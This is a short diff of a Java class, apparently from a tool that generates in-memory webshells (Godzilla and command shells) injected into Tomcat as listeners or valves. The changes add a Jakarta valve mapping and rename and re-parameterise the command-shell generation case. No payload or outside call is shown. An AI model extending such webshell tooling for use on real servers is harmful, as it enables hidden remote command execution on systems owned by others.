@@ -49,7 +49,6 @@ public class TomcatShell {
         GODZILLA_SHELL_MAP.put(LISTENER, Pair.of(GodzillaListener.class, TomcatListenerInjector.class));
         GODZILLA_SHELL_MAP.put(JAKARTA_LISTENER, Pair.of(GodzillaListener.class, TomcatListenerInjector.class));
         GODZILLA_SHELL_MAP.put(VALVE, Pair.of(GodzillaValve.class, TomcatValveInjector.class));
-        // tomcat 无法同时引入两个版本的包
         GODZILLA_SHELL_MAP.put(JAKARTA_VALVE, Pair.of(GodzillaValve.class, TomcatValveInjector.class));
     }
 
@@ -64,6 +63,7 @@ public class TomcatShell {
         COMMAND_SHELL_MAP.put(LISTENER, Pair.of(CommandListener.class, TomcatListenerInjector.class));
         COMMAND_SHELL_MAP.put(JAKARTA_LISTENER, Pair.of(CommandListener.class, TomcatListenerInjector.class));
         COMMAND_SHELL_MAP.put(VALVE, Pair.of(CommandValve.class, TomcatValveInjector.class));
+        COMMAND_SHELL_MAP.put(JAKARTA_VALVE, Pair.of(CommandValve.class, TomcatValveInjector.class));
     }
 
     @SneakyThrows
@@ -89,12 +89,12 @@ public class TomcatShell {
                 );
                 break;
             }
-            case CMD: {
+            case COMMAND: {
                 classPair = COMMAND_SHELL_MAP.get(shellType);
                 CommandShellConfig commandConfig = (CommandShellConfig) shellConfig;
                 shellBytes = CommandGenerator.generate(classPair.getLeft(),
                         commandConfig.getShellClassName(),
-                        commandConfig.getHeaderName());
+                        commandConfig.getParamName(), useJakarta, targetJdkVersion);
                 break;
             }
             default:
